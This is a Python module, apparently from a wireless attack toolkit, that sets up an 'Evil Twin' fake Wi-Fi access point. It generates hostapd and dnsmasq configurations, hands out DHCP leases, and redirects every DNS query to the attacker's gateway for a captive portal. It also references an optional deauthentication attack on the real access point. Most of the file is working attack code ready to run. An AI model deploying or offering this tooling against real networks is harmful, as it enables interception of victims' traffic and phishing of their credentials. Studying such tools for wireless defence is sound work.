# -*- coding: utf-8 -*-
"""Handles setting up Evil Twin attacks (Fake AP)."""

import subprocess
import time
import os
import signal
import tempfile
import shlex

# Define global variables for processes
hostapd_process = None
dnsmasq_process = None
dos_process = None # Optional DoS against original AP

# Default configuration templates
HOSAPD_CONF_TEMPLATE = """
interface={monitor_interface}
driver=nl80211
ssid={essid}
hw_mode=g
channel={channel}
# Enable WPA2-PSK for a more convincing fake AP (optional)
# macaddr_acl=0
# auth_algs=1
# ignore_broadcast_ssid=0
# wpa=2
# wpa_passphrase={password} # Requires a password if WPA enabled
# wpa_key_mgmt=WPA-PSK
# wpa_pairwise=TKIP CCMP
# rsn_pairwise=CCMP
"""

DNSMASQ_CONF_TEMPLATE = """
# Basic DHCP server configuration
interface={monitor_interface}
# Set the IP range for DHCP clients
dhcp-range={dhcp_range_start},{dhcp_range_end},{dhcp_lease_time}
# Set the gateway IP (the Evil Twin AP itself)
dhcp-option=3,{gateway_ip}
# Set the DNS server (the Evil Twin AP itself, or a public one)
dhcp-option=6,{dns_ip}
# Optional: Log DHCP requests
# log-dhcp
# Make dnsmasq authoritative
dhcp-authoritative
# Respond to DNS queries for all domains with the gateway IP (Captive Portal)
address=/#/{gateway_ip}
"""

def run_command(command, capture=True, timeout=None):
    """Executes a shell command (simplified)."""
    try:
        result = subprocess.run(
            command, 
            shell=True, 
            check=True, 
            capture_output=capture, 
            text=True, 
            encoding="utf-8", 
            errors="ignore",
            timeout=timeout
        )
        return result.stdout.strip() if capture else "", result.stderr.strip() if capture else ""
    except subprocess.TimeoutExpired:
        return None, "Command timed out"
    except subprocess.CalledProcessError as e:
        stderr_output = e.stderr.strip() if capture else "Process failed"
        return None, stderr_output
    except FileNotFoundError:
        return None, "Command not found"

def stop_process(process, name="process"):
    """Stops a running process group."""
    if process and process.poll() is None:
        print(f"[*] Stopping {name} (PID: {process.pid})...")
        try:
            os.killpg(os.getpgid(process.pid), signal.SIGTERM)
            process.wait(timeout=3)
            print(f"[+] {name} stopped gracefully.")
        except ProcessLookupError:
            print(f"[!] {name} already terminated.")
        except subprocess.TimeoutExpired:
            print(f"[!] {name} did not terminate gracefully, sending SIGKILL...")
            try:
                os.killpg(os.getpgid(process.pid), signal.SIGKILL)
                process.wait(timeout=2)
            except Exception as kill_err:
                 print(f"[!] Error sending SIGKILL to {name}: {kill_err}")
        except Exception as e:
            print(f"[!] Error stopping {name}: {e}")
        finally:
            process = None
    return None

def configure_interface_ip(interface, ip_address, netmask="255.255.255.0"):
    """Assigns an IP address to the monitor interface."""
    print(f"[*] Configuring IP {ip_address}/{netmask} on {interface}...")
    # Bring interface down first (sometimes needed)
    # run_command(f"ip link set {interface} down", capture=False)
    # time.sleep(0.5)
    # Assign IP
    stdout, stderr = run_command(f"ip addr add {ip_address}/{netmask} dev {interface}", capture=True)
    if stderr and "File exists" not in stderr: # Ignore if IP already exists
         print(f"[!] Error adding IP address: {stderr}")
         return False
    # Bring interface up
    stdout_up, stderr_up = run_command(f"ip link set {interface} up", capture=True)
    if stderr_up:
         print(f"[!] Error bringing interface {interface} up: {stderr_up}")
         return False
    print(f"[+] Interface {interface} configured and up.")
    return True

def start_hostapd(monitor_interface, essid, channel):
    """Starts hostapd to create the fake AP."""
    global hostapd_process

    if hostapd_process and hostapd_process.poll() is None:
        print("[!] Hostapd process is already running.")
        return None, None

    # Check if hostapd exists
    stdout_check, _ = run_command("which hostapd")
    if not stdout_check:
         print("[!] Error: hostapd command not found.")
         return None, None

    # Create temporary config file
    conf_content = HOSAPD_CONF_TEMPLATE.format(
        monitor_interface=monitor_interface,
        essid=essid,
        channel=channel
        # Add password if implementing WPA
    )
    try:
        with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".conf") as temp_conf:
            temp_conf.write(conf_content)
            conf_path = temp_conf.name
        print(f"[*] Generated hostapd config: {conf_path}")

        command = f"hostapd {shlex.quote(conf_path)}"
        print(f"[*] Starting Fake AP (hostapd): {command}")
        # Use Popen
        hostapd_process = subprocess.Popen(
            command, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE, 
            text=True, 
            encoding="utf-8", 
            errors="ignore",
            preexec_fn=os.setsid
        )
        print(f"[+] Hostapd started (PID: {hostapd_process.pid}).")
        # Give it time to initialize
        time.sleep(3)
        # Check if it failed immediately
        if hostapd_process.poll() is not None:
             print("[!] Hostapd terminated unexpectedly. Check stderr:")
             stderr_output = hostapd_process.stderr.read()
             print(stderr_output)
             stop_process(hostapd_process, "hostapd") # Ensure cleanup
             hostapd_process = None
             os.remove(conf_path) # Clean up config file
             return None, conf_path
             
        return hostapd_process, conf_path
    except Exception as e:
        print(f"[!] Failed to start hostapd: {e}")
        if conf_path and os.path.exists(conf_path):
             os.remove(conf_path)
        hostapd_process = None
        return None, None

def start_dnsmasq(monitor_interface, gateway_ip="10.0.0.1", dhcp_range_start="10.0.0.10", dhcp_range_end="10.0.0.50", dhcp_lease_time="1h", dns_ip="10.0.0.1"):
    """Starts dnsmasq for DHCP and DNS."""
    global dnsmasq_process

    if dnsmasq_process and dnsmasq_process.poll() is None:
        print("[!] Dnsmasq process is already running.")
        return None, None

    # Check if dnsmasq exists
    stdout_check, _ = run_command("which dnsmasq")
    if not stdout_check:
         print("[!] Error: dnsmasq command not found.")
         return None, None

    # Create temporary config file
    conf_content = DNSMASQ_CONF_TEMPLATE.format(
        monitor_interface=monitor_interface,
        gateway_ip=gateway_ip,
        dhcp_range_start=dhcp_range_start,
        dhcp_range_end=dhcp_range_end,
        dhcp_lease_time=dhcp_lease_time,
        dns_ip=dns_ip
    )
    try:
        with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".conf") as temp_conf:
            temp_conf.write(conf_content)
            conf_path = temp_conf.name
        print(f"[*] Generated dnsmasq config: {conf_path}")

        # -C: Specify config file
        # -d: Keep in foreground for debugging (optional, remove for background)
        # -k: Keep in foreground (alternative)
        # --log-queries: Log DNS queries (optional)
        # --no-resolv: Don't read /etc/resolv.conf
        command = f"dnsmasq -C {shlex.quote(conf_path)} --no-resolv -k"
        print(f"[*] Starting DHCP/DNS (dnsmasq): {command}")
        # Use Popen
        dnsmasq_process = subprocess.Popen(
            command, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE, 
            text=True, 
            encoding="utf-8", 
            errors="ignore",
            preexec_fn=os.setsid
        )
        print(f"[+] Dnsmasq started (PID: {dnsmasq_process.pid}).")
        time.sleep(2) # Give it time to initialize
        # Check if it failed immediately
        if dnsmasq_process.poll() is not None:
             print("[!] Dnsmasq terminated unexpectedly. Check stderr:")
             stderr_output = dnsmasq_process.stderr.read()
             print(stderr_output)
             stop_process(dnsmasq_process, "dnsmasq") # Ensure cleanup
             dnsmasq_process = None
             os.remove(conf_path) # Clean up config file
             return None, conf_path
             
        return dnsmasq_process, conf_path
    except Exception as e:
        print(f"[!] Failed to start dnsmasq: {e}")
        if conf_path and os.path.exists(conf_path):
             os.remove(conf_path)
        dnsmasq_process = None
        return None, None

def start_evil_twin(monitor_interface, essid, channel, gateway_ip="10.0.0.1"):
    """Starts the basic Evil Twin attack (Fake AP + DHCP/DNS)."""
    hostapd_conf_file = None
    dnsmasq_conf_file = None

    print("\n--- Starting Evil Twin Attack ---")
    # 1. Configure IP address on the interface
    if not configure_interface_ip(monitor_interface, gateway_ip):
        print("[!] Failed to configure IP address. Aborting Evil Twin.")
        return False

    # 2. Start Hostapd (Fake AP)
    hostapd_proc, hostapd_conf_file = start_hostapd(monitor_interface, essid, channel)
    if not hostapd_proc:
        print("[!] Failed to start hostapd. Aborting Evil Twin.")
        # Clean up IP config?
        run_command(f"ip addr del {gateway_ip}/24 dev {monitor_interface}", capture=False)
        return False

    # 3. Start Dnsmasq (DHCP/DNS)
    dnsmasq_proc, dnsmasq_conf_file = start_dnsmasq(monitor_interface, gateway_ip=gateway_ip)
    if not dnsmasq_proc:
        print("[!] Failed to start dnsmasq. Stopping hostapd and aborting.")
        stop_process(hostapd_process, "hostapd")
        if hostapd_conf_file: os.remove(hostapd_conf_file)
        run_command(f"ip addr del {gateway_ip}/24 dev {monitor_interface}", capture=False)
        return False

    print("[+] Evil Twin components (hostapd, dnsmasq) started successfully.")
    print(f"[*] Fake AP SSID: {essid}")
    print(f"[*] Gateway IP: {gateway_ip}")
    print("[*] Clients connecting will receive IPs in the 10.0.0.x range.")
    print("[*] All DNS queries will resolve to the gateway (for captive portal setup)." )
    print("[*] Press Ctrl+C to stop the Evil Twin attack.")
    
    # Keep track of config files for cleanup
    global _evil_twin_config_files
    _evil_twin_config_files = [hostapd_conf_file, dnsmasq_conf_file]
    
    return True

def stop_evil_twin():
    """Stops all components of the Evil Twin attack."""
    global hostapd_process, dnsmasq_process, dos_process, _evil_twin_config_files
    print("\n--- Stopping Evil Twin Attack ---")
    
    stopped_something = False
    if dnsmasq_process:
         dnsmasq_process = stop_process(dnsmasq_process, "dnsmasq")
         stopped_something = True
    if hostapd_process:
         hostapd_process = stop_process(hostapd_process, "hostapd")
         stopped_something = True
    if dos_process: # If DoS was implemented and running
         # Assuming dos_process is managed similarly (e.g., aireplay-ng)
         # from handshake_capture import stop_deauth_attack # Or similar
         # stop_deauth_attack() # Call the appropriate stop function
         dos_process = stop_process(dos_process, "DoS attack") # Generic stop if needed
         stopped_something = True
         
    # Clean up config files
    if _evil_twin_config_files:
         print("[*] Cleaning up temporary config files...")
         for conf_file in _evil_twin_config_files:
              if conf_file and os.path.exists(conf_file):
                   try:
                       os.remove(conf_file)
                   except OSError as e:
                        print(f"[!] Warning: Failed to remove config file {conf_file}: {e}")
         _evil_twin_config_files = []
         
    # Optional: Remove IP address from interface (might interfere if user wants to use it)
    # print("[*] Removing IP configuration...")
    # run_command(f"ip addr flush dev {monitor_interface}", capture=False) # Be careful with flush
    
    if stopped_something:
         print("[+] Evil Twin components stopped.")
    else:
         print("[*] No active Evil Twin components found to stop.")

# Store config file paths globally for cleanup
_evil_twin_config_files = []

# --- Example Usage --- 
if __name__ == "__main__":
    try:
        from interface_manager import get_wireless_interfaces, enable_monitor_mode, disable_monitor_mode
    except ImportError:
        print("[!] Failed to import interface_manager. Make sure it is accessible.")
        exit(1)

    # Check for root
    if os.geteuid() != 0:
        print("[!] Requires root privileges.")
        exit(1)

    # --- Configuration ---
    TARGET_ESSID = "MyFakeAP" # Name for the Evil Twin
    TARGET_CHANNEL = "6"       # Channel for the Evil Twin
    # --- End Configuration ---

    interfaces = get_wireless_interfaces()
    if not interfaces:
        print("[!] No wireless interfaces found.")
        exit(1)
    selected_interface = interfaces[0]

    print(f"[*] Using interface: {selected_interface}")
    # Enable monitor mode - hostapd might work better with standard managed mode interface sometimes
    # For simplicity, we use monitor mode interface as input, but hostapd config uses it directly.
    # A better approach might create a monitor VIF and use the base interface for hostapd if needed.
    monitor_iface = enable_monitor_mode(selected_interface)
    if not monitor_iface:
        print("[!] Failed to enable monitor mode (needed for IP config in this example).")
        # If hostapd runs on base iface, we might not need monitor mode enabled via airmon
        # For now, assume we need a VIF or the monitor iface works.
        exit(1)

    # Start the Evil Twin
    if start_evil_twin(monitor_iface, TARGET_ESSID, TARGET_CHANNEL):
        try:
            # Keep the attack running until user interrupts
            while True:
                # Check status of processes (optional)
                if hostapd_process and hostapd_process.poll() is not None:
                     print("[!] Hostapd process terminated unexpectedly!")
                     break
                if dnsmasq_process and dnsmasq_process.poll() is not None:
                     print("[!] Dnsmasq process terminated unexpectedly!")
                     break
                # Add monitoring features here (e.g., watch dnsmasq logs for DHCP leases)
                time.sleep(5)
        except KeyboardInterrupt:
            print("\n[!] User requested shutdown.")
        finally:
            stop_evil_twin()
    else:
        print("[!] Failed to start Evil Twin attack.")
        # Ensure monitor mode is disabled if it was enabled
        disable_monitor_mode(monitor_iface)

    print("[*] Example finished.")

